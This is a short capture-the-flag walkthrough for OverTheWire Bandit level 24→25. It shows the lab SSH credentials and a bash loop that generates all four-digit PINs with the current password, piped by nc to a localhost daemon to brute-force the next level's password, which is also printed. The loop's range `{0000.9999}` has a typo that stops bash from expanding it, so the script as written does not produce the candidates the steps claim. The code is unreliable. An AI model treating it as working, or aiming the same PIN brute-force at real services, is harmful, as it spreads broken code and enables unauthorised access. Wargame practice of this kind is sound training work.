# Bandit Level 24 → Level 25
(Updated: 4 August 2025)

## Credentials
- **Username:** `bandit24`
- **Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

## Connection
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

## Hints & Commands Learned
- cat
- vim
- mktemp

## Steps to Solve
1. Step 1 – Use `ssh` to get access to OverTheWire labs.
2. Step 2 - Use `mktemp -d` to create temp directory to work with.
3. Step 3 - Move to that temp directory.
4. Step 4 - Use `vim create_possibilities` to create a file containing possibilities to get the password.
5. Step 5 - Add content for `create_possibilities`: 
```
#!/bin/bash

for i in {0000.9999}
do
echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done
```
6. Step 6 - Change permission for `create_possibilities` and run it.
```
chmod +x create_possibilities
./create_possibilities
```
7. Step 7 - Use `cat possibilities.txt | nc localhost 30002 > result.txt` to get the password in file `result.txt`.

## Next Level Password
`iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`